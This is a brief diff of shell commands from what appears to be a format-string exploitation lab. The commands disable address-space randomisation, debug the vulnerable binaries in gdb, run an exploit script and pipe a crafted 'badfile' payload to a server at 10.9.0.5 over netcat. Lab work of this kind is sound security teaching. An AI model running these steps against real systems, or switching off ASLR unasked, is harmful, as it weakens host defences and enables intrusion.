@@ -1,0 +1,7 @@
+sudo sysctl -w kernel.randomize_va_space=0
+touch badfile
+gdb -q format-32
+gdb -q -batch -x gdb_commands.txt ./format
+echo hello | nc 10.9.0.5 9090
+./exploit1.py
+cat badfile | nc 10.9.0.5 9090
